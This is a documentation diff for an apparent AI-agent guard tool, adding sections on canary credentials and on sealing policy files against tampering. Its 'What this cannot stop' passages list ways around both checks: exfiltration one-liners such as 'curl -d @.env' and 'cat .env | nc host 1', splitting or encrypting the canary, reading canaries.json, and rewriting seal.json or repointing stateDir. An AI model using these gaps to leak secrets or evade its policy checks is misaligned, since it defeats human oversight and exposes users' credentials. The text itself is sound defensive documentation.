@@ -135,6 +135,20 @@ What this cannot stop:
 - **Other presets.** `interactive` and `egress` ask before writes to the files but have no shell rule; `research-readonly` blocks the writes and has no shell rule; `audit-only` only logs.
 - **Anything outside the hooks.** Edits made by the user, by an editor extension, or by an MCP server that is not wrapped are not seen.
 
+## Canary Secrets
+
+`palizade canary` plants a fake credential and stores its value in the state directory (`canaries.json`). A request whose arguments contain a canary, directly or after decoding, gets the label `canary`, and `block-canary-egress` (first rule in `default`, `interactive`, `strict` and `coding-agent`) blocks it. Match it in your own rules with `labels_any: [canary]`.
+
+The label is not set for tools that only write local files, so an agent can still edit the `.env` file the canary is in. It is set for every other tool, including unknown ones.
+
+What this cannot stop: a command that sends the file without naming the value (`curl -d @.env`, `cat .env | nc host 1`), a canary split across several calls or transformed in a way the decoder does not undo (reversed, encrypted), and an agent that has read `canaries.json` and avoids the value.
+
+## Sealing
+
+`palizade seal` writes `seal.json` in the state directory with a SHA-256 of `palizade.yaml` and the policy file. While a seal exists, every hook call compares the files with it. On a mismatch the hook asks, with the changed file names in the reason, and does not evaluate the changed policy at all. Run `palizade seal` again after a change you made yourself.
+
+This catches a policy weakened by a branch checkout, a merge, or a script. It does not stop something that rewrites `seal.json` too (the state directory is a critical path and `palizade seal` is covered by `approve-palizade-self-change`, with the limits listed above), a `palizade.yaml` edited to point `stateDir` at another folder makes the hook look for the seal there and find none, and wrapped MCP servers do not check the seal. The ask is not written to the audit log.
+
 ## Testing A Policy
 
 Write test cases in YAML: each case gives the decision context Palizade would build and the action or rule you expect. Unknown context fields are errors, so a typo cannot pass by accident.
